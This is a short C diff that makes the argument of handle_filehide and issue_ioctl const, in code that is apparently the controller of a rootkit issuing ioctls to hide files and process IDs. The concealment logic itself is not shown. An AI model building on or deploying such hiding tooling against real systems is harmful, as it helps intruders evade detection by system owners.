@@ -75,7 +75,7 @@ handle_ping(void *arg)
 int
 handle_filehide(void *arg)
 {
-    return issue_ioctl(G7_FILEHIDE, (char *)arg);
+    return issue_ioctl(G7_FILEHIDE, (const char *)arg);
 }
 
 int
@@ -94,7 +94,7 @@ handle_hidepid(void *arg)
 }
 
 int
-issue_ioctl(unsigned long request, char *argp)
+issue_ioctl(unsigned long request, const char *argp)
 {
     int fd;
     char device[BUFLEN];
